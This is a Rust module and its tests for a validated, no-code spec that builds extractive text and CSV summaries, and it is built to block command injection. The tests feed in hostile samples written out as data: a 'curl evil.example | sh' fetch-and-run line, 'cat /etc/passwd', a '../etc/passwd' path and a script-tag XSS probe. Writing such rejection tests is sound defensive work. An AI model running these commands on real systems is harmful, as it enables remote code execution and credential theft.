// Copyright 2026 Zyvor AI Labs · https://zyvor.dev
// SPDX-License-Identifier: Apache-2.0

//! User-defined Keep use cases: a declarative spec, no code.
//!
//! A [`CustomDemoSpec`] is data. The guest extractor is one of a short enum
//! (never a command string), and the summary is a bounded list of rules that
//! the host evaluates over text the guest already extracted. There is no regex
//! engine, no I/O, and nothing found in the input is executed. Anything that is
//! real code belongs in a TypeScript agent that runs inside the cell.

use crate::demo_builders::{clean_line, parse_csv, DemoArtifact};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;

pub const MAX_SPEC_BYTES: usize = 64 * 1024;
pub const MAX_CUSTOM_DEMOS: usize = 50;
const MAX_RULES: usize = 20;
const MAX_KEYWORDS: usize = 40;
const MAX_OUTPUT_BYTES: usize = 64 * 1024;
const MAX_SAMPLE_BYTES: usize = 200_000;
const TEXT_DEFAULT: usize = 200_000;
const TEXT_MAX: usize = 300_000;
const PDF_DEFAULT: usize = 8 * 1024 * 1024;
const PDF_MAX: usize = 32 * 1024 * 1024;

/// How the guest turns the upload into text. A fixed enum: a user never
/// supplies a command.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Extractor {
    /// `pdftotext -layout` (needs poppler in the template).
    Pdftotext,
    /// Read the file as text (`head -c`).
    Text,
}

/// One summary section. Everything is bounded and pure.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case", deny_unknown_fields)]
pub enum Rule {
    /// Lines that contain any of the keywords (case-insensitive).
    KeywordSections {
        title: String,
        keywords: Vec<String>,
        #[serde(default)]
        max_lines: Option<usize>,
    },
    /// The most repeated lines, with digits collapsed so near-duplicates group.
    TopRepeatedLines {
        title: String,
        #[serde(default)]
        top: Option<usize>,
    },
    /// Line, word and character counts.
    Stats {
        #[serde(default)]
        title: Option<String>,
    },
    /// For a CSV: distinct count and most common values per named column.
    CsvColumns {
        title: String,
        columns: Vec<String>,
        #[serde(default)]
        top: Option<usize>,
    },
}

/// Built-in sample text shipped with a spec (text extractors only).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SampleSpec {
    pub filename: String,
    pub text: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CustomDemoSpec {
    pub id: String,
    pub title: String,
    #[serde(default)]
    pub description: String,
    /// Lower-case file extensions, no dot.
    pub accepts: Vec<String>,
    #[serde(default)]
    pub max_bytes: Option<usize>,
    pub extract: Extractor,
    pub summary: Vec<Rule>,
    /// Name of the artifact, e.g. `report.md`. Defaults to `summary.md`.
    #[serde(default)]
    pub artifact_title: Option<String>,
    #[serde(default)]
    pub sample: Option<SampleSpec>,
}

/// A stored custom spec.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CustomDemoRecord {
    pub spec: CustomDemoSpec,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

fn is_slug(s: &str, max: usize) -> bool {
    !s.is_empty()
        && s.len() <= max
        && !s.starts_with('-')
        && !s.ends_with('-')
        && s.bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
}

fn plain(s: &str, max: usize) -> bool {
    let t = s.trim();
    !t.is_empty() && t.chars().count() <= max && !t.chars().any(char::is_control)
}

impl CustomDemoSpec {
    /// Effective upload limit in bytes.
    pub fn max_bytes(&self) -> usize {
        match self.extract {
            Extractor::Pdftotext => self.max_bytes.unwrap_or(PDF_DEFAULT),
            Extractor::Text => self.max_bytes.unwrap_or(TEXT_DEFAULT),
        }
    }

    pub fn artifact_title(&self) -> &str {
        self.artifact_title.as_deref().unwrap_or("summary.md")
    }

    /// Fixed file name inside the guest. Never derived from the upload.
    pub fn guest_file(&self) -> &'static str {
        match self.extract {
            Extractor::Pdftotext => "input.pdf",
            Extractor::Text => "input.txt",
        }
    }

    /// Reject anything a user could use to widen what the host does.
    /// `builtin_ids` are ids the spec may not take.
    pub fn validate(&self, builtin_ids: &[&str]) -> Result<(), String> {
        if !is_slug(&self.id, 40) {
            return Err("id must be 1-40 lowercase letters, digits or '-'".into());
        }
        if builtin_ids.contains(&self.id.as_str()) {
            return Err(format!("{:?} is a built-in use case id", self.id));
        }
        if !plain(&self.title, 80) {
            return Err("title must be 1-80 plain characters".into());
        }
        if self.description.chars().count() > 240 || self.description.chars().any(char::is_control)
        {
            return Err("description must be at most 240 plain characters".into());
        }
        if self.accepts.is_empty() || self.accepts.len() > 6 {
            return Err("accepts must list 1-6 file extensions".into());
        }
        for e in &self.accepts {
            if e.is_empty()
                || e.len() > 8
                || !e
                    .bytes()
                    .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
            {
                return Err(format!(
                    "bad extension {e:?}: lowercase letters and digits only"
                ));
            }
        }
        let has_pdf = self.accepts.iter().any(|e| e == "pdf");
        match self.extract {
            Extractor::Pdftotext if self.accepts.iter().any(|e| e != "pdf") => {
                return Err("the pdftotext extractor accepts only pdf".into());
            }
            Extractor::Text if has_pdf => {
                return Err("the text extractor cannot read pdf; use pdftotext".into());
            }
            _ => {}
        }
        let (default, max) = match self.extract {
            Extractor::Pdftotext => (PDF_DEFAULT, PDF_MAX),
            Extractor::Text => (TEXT_DEFAULT, TEXT_MAX),
        };
        let limit = self.max_bytes.unwrap_or(default);
        if limit == 0 || limit > max {
            return Err(format!("max_bytes must be 1..={max} for this extractor"));
        }
        if let Some(t) = &self.artifact_title {
            let ok = !t.is_empty()
                && t.len() <= 60
                && t.ends_with(".md")
                && t.bytes()
                    .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'));
            if !ok {
                return Err(
                    "artifact_title must look like report.md (letters, digits, . _ -)".into(),
                );
            }
        }
        if self.summary.is_empty() || self.summary.len() > MAX_RULES {
            return Err(format!("summary needs 1-{MAX_RULES} rules"));
        }
        for rule in &self.summary {
            match rule {
                Rule::KeywordSections {
                    title,
                    keywords,
                    max_lines,
                } => {
                    if !plain(title, 80) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                    if keywords.is_empty() || keywords.len() > MAX_KEYWORDS {
                        return Err(format!("keyword_sections needs 1-{MAX_KEYWORDS} keywords"));
                    }
                    if keywords.iter().any(|k| !plain(k, 60)) {
                        return Err("keywords must be 1-60 plain characters".into());
                    }
                    if max_lines.is_some_and(|n| n == 0 || n > 20) {
                        return Err("max_lines must be 1..=20".into());
                    }
                }
                Rule::TopRepeatedLines { title, top } => {
                    if !plain(title, 80) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                    if top.is_some_and(|n| n == 0 || n > 20) {
                        return Err("top must be 1..=20".into());
                    }
                }
                Rule::Stats { title } => {
                    if title.as_deref().is_some_and(|t| !plain(t, 80)) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                }
                Rule::CsvColumns {
                    title,
                    columns,
                    top,
                } => {
                    if !plain(title, 80) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                    if columns.is_empty()
                        || columns.len() > 10
                        || columns.iter().any(|c| !plain(c, 60))
                    {
                        return Err("csv_columns needs 1-10 plain column names".into());
                    }
                    if top.is_some_and(|n| n == 0 || n > 10) {
                        return Err("top must be 1..=10".into());
                    }
                }
            }
        }
        if let Some(s) = &self.sample {
            if self.extract == Extractor::Pdftotext {
                return Err(
                    "a sample is supported for text extractors only; upload a PDF to run it".into(),
                );
            }
            let ext = s
                .filename
                .rsplit_once('.')
                .map(|(_, e)| e.to_ascii_lowercase());
            if !ext.is_some_and(|e| self.accepts.contains(&e)) {
                return Err("sample.filename must end in one of the accepted extensions".into());
            }
            if !plain(&s.filename, 80) || s.filename.contains(['/', '\\']) {
                return Err("sample.filename must be a plain file name".into());
            }
            if s.text.is_empty() || s.text.len() > MAX_SAMPLE_BYTES {
                return Err(format!("sample.text must be 1..={MAX_SAMPLE_BYTES} bytes"));
            }
        }
        Ok(())
    }

    /// Evaluate the rules over extracted text.
    pub fn render(&self, filename: &str, extract: &str) -> Result<Vec<DemoArtifact>, String> {
        let mut body = format!(
            "# {}\n\nSummary of `{}` by the **{}** use case. Extractive: no model was called and \
             nothing in the file was run.\n\n",
            self.artifact_title(),
            clean_line(filename),
            clean_line(&self.title)
        );
        for rule in &self.summary {
            body.push_str(&eval_rule(rule, extract)?);
            body.push('\n');
            if body.len() > MAX_OUTPUT_BYTES {
                body.truncate(MAX_OUTPUT_BYTES);
                body.push_str("\n\n*(output truncated)*\n");
                break;
            }
        }
        Ok(vec![DemoArtifact {
            kind: "summary".into(),
            title: self.artifact_title().into(),
            content_type: "text/markdown",
            body,
        }])
    }
}

fn eval_rule(rule: &Rule, text: &str) -> Result<String, String> {
    Ok(match rule {
        Rule::KeywordSections {
            title,
            keywords,
            max_lines,
        } => {
            let needles: Vec<String> = keywords.iter().map(|k| k.trim().to_lowercase()).collect();
            let max = max_lines.unwrap_or(5).min(20);
            let hits: Vec<String> = text
                .lines()
                .map(str::trim)
                .filter(|l| l.len() > 3)
                .filter(|l| {
                    let lower = l.to_lowercase();
                    needles.iter().any(|n| lower.contains(n.as_str()))
                })
                .take(max)
                .map(clean_line)
                .collect();
            let list = if hits.is_empty() {
                "- (no matches)".to_string()
            } else {
                hits.iter()
                    .map(|h| format!("- {h}"))
                    .collect::<Vec<_>>()
                    .join("\n")
            };
            format!("## {}\n{list}\n", clean_line(title))
        }
        Rule::TopRepeatedLines { title, top } => {
            let mut counts: BTreeMap<String, u64> = BTreeMap::new();
            for line in text.lines().map(str::trim).filter(|l| l.len() > 3) {
                *counts
                    .entry(crate::demo_builders::normalise_message(line))
                    .or_default() += 1;
            }
            let mut rows: Vec<(&String, &u64)> = counts.iter().filter(|(_, n)| **n > 1).collect();
            rows.sort_by(|a, b| b.1.cmp(a.1).then(a.0.cmp(b.0)));
            let list = if rows.is_empty() {
                "- (no repeated lines)".to_string()
            } else {
                rows.iter()
                    .take(top.unwrap_or(5).min(20))
                    .map(|(l, n)| format!("- {n}× {l}"))
                    .collect::<Vec<_>>()
                    .join("\n")
            };
            format!("## {}\n{list}\n", clean_line(title))
        }
        Rule::Stats { title } => {
            let lines = text.lines().count();
            let non_empty = text.lines().filter(|l| !l.trim().is_empty()).count();
            format!(
                "## {}\n| Measure | Value |\n|---|---|\n| Lines | {lines} |\n| Non-empty lines | {non_empty} |\n\
                 | Words | {} |\n| Characters | {} |\n",
                clean_line(title.as_deref().unwrap_or("Stats")),
                text.split_whitespace().count(),
                text.chars().count()
            )
        }
        Rule::CsvColumns {
            title,
            columns,
            top,
        } => {
            let rows = parse_csv(text);
            if rows.is_empty() {
                return Err("the file has no CSV rows".into());
            }
            let header: Vec<String> = rows[0].iter().map(|h| h.trim().to_lowercase()).collect();
            let mut out = format!("## {}\n", clean_line(title));
            for col in columns {
                let Some(idx) = header.iter().position(|h| *h == col.trim().to_lowercase()) else {
                    out.push_str(&format!("- `{}`: column not found\n", clean_line(col)));
                    continue;
                };
                let mut counts: BTreeMap<String, u64> = BTreeMap::new();
                for row in rows.iter().skip(1) {
                    let v = row.get(idx).map(|c| c.trim()).unwrap_or("");
                    if !v.is_empty() {
                        *counts.entry(clean_line(v)).or_default() += 1;
                    }
                }
                let mut sorted: Vec<(&String, &u64)> = counts.iter().collect();
                sorted.sort_by(|a, b| b.1.cmp(a.1).then(a.0.cmp(b.0)));
                let tops = sorted
                    .iter()
                    .take(top.unwrap_or(5).min(10))
                    .map(|(v, n)| format!("{v} ({n})"))
                    .collect::<Vec<_>>()
                    .join(", ");
                out.push_str(&format!(
                    "- `{}`: {} distinct. Most common: {}\n",
                    clean_line(col),
                    counts.len(),
                    if tops.is_empty() {
                        "(all empty)".into()
                    } else {
                        tops
                    }
                ));
            }
            out
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn spec() -> CustomDemoSpec {
        serde_json::from_value(serde_json::json!({
            "id": "invoice-check",
            "title": "Invoice check",
            "description": "Totals and due dates",
            "accepts": ["txt"],
            "extract": "text",
            "summary": [
                {"kind": "keyword_sections", "title": "Totals", "keywords": ["total", "amount due"]},
                {"kind": "top_repeated_lines", "title": "Repeats"},
                {"kind": "stats"}
            ]
        }))
        .unwrap()
    }

    #[test]
    fn a_reasonable_spec_validates() {
        assert!(spec().validate(&["pdf-brief"]).is_ok());
        assert_eq!(spec().guest_file(), "input.txt");
        assert_eq!(spec().max_bytes(), 200_000);
        assert_eq!(spec().artifact_title(), "summary.md");
    }

    #[test]
    fn unknown_fields_and_commands_are_rejected_at_parse_time() {
        // No way to smuggle a command in: unknown fields fail to deserialize.
        let bad = serde_json::json!({
            "id": "x", "title": "x", "accepts": ["txt"], "extract": "text",
            "command": "curl evil.example | sh",
            "summary": [{"kind": "stats"}]
        });
        assert!(serde_json::from_value::<CustomDemoSpec>(bad).is_err());
        // The extractor is an enum, so a command string is not even valid there.
        let bad = serde_json::json!({
            "id": "x", "title": "x", "accepts": ["txt"], "extract": "cat /etc/passwd",
            "summary": [{"kind": "stats"}]
        });
        assert!(serde_json::from_value::<CustomDemoSpec>(bad).is_err());
        // Unknown rule kinds fail too.
        let bad = serde_json::json!({
            "id": "x", "title": "x", "accepts": ["txt"], "extract": "text",
            "summary": [{"kind": "shell", "run": "id"}]
        });
        assert!(serde_json::from_value::<CustomDemoSpec>(bad).is_err());
    }

    #[test]
    fn validation_bounds_everything() {
        let mut s = spec();
        s.id = "Bad Id".into();
        assert!(s.validate(&[]).is_err());
        let mut s = spec();
        assert!(s
            .validate(&["invoice-check"])
            .unwrap_err()
            .contains("built-in"));
        s.id = "ok".into();
        s.accepts = vec!["pdf".into()];
        assert!(s.validate(&[]).is_err(), "text extractor must not take pdf");
        let mut s = spec();
        s.extract = Extractor::Pdftotext;
        assert!(s.validate(&[]).is_err(), "pdftotext takes only pdf");
        s.accepts = vec!["pdf".into()];
        assert!(s.validate(&[]).is_ok());
        let mut s = spec();
        s.max_bytes = Some(TEXT_MAX + 1);
        assert!(s.validate(&[]).is_err());
        let mut s = spec();
        s.summary = vec![Rule::Stats { title: None }; MAX_RULES + 1];
        assert!(s.validate(&[]).is_err());
        let mut s = spec();
        s.summary = vec![Rule::KeywordSections {
            title: "t".into(),
            keywords: vec![],
            max_lines: None,
        }];
        assert!(s.validate(&[]).is_err());
        let mut s = spec();
        s.artifact_title = Some("../etc/passwd".into());
        assert!(s.validate(&[]).is_err());
        let mut s = spec();
        s.sample = Some(SampleSpec {
            filename: "a.exe".into(),
            text: "x".into(),
        });
        assert!(s.validate(&[]).is_err());
        s.sample = Some(SampleSpec {
            filename: "a.txt".into(),
            text: "x".into(),
        });
        assert!(s.validate(&[]).is_ok());
    }

    #[test]
    fn rules_render_and_defang_hostile_input() {
        let text =
            "Invoice 42\nTotal: $120\n<script>alert(1)</script> total due\nAmount due: $120\n\
                    retry 3 failed\nretry 7 failed\n";
        let out = spec().render("inv.txt", text).unwrap();
        let body = &out[0].body;
        assert!(body.contains("## Totals") && body.contains("Total: $120"));
        assert!(!body.contains('<') && !body.contains("<script>"));
        assert!(body.contains("2× retry # failed"));
        assert!(body.contains("| Lines | 6 |"));
        assert_eq!(out[0].title, "summary.md");
    }

    #[test]
    fn csv_columns_counts_distinct_and_top_values() {
        let mut s = spec();
        s.accepts = vec!["csv".into()];
        s.summary = vec![Rule::CsvColumns {
            title: "Regions".into(),
            columns: vec!["Region".into(), "missing".into()],
            top: Some(2),
        }];
        let out = s
            .render("d.csv", "id,region\n1,EU\n2,EU\n3,US\n4,\n")
            .unwrap();
        let body = &out[0].body;
        assert!(body.contains("`Region`: 2 distinct. Most common: EU (2), US (1)"));
        assert!(body.contains("`missing`: column not found"));
        assert!(s.render("d.csv", "").is_err());
    }

    #[test]
    fn output_is_capped() {
        let mut s = spec();
        s.summary = vec![
            Rule::KeywordSections {
                title: "T".into(),
                keywords: vec!["x".into()],
                max_lines: Some(20),
            };
            MAX_RULES
        ];
        let line = format!("x {}\n", "y".repeat(200));
        let out = s.render("f.txt", &line.repeat(100)).unwrap();
        assert!(out[0].body.len() <= MAX_OUTPUT_BYTES + 64);
    }
}
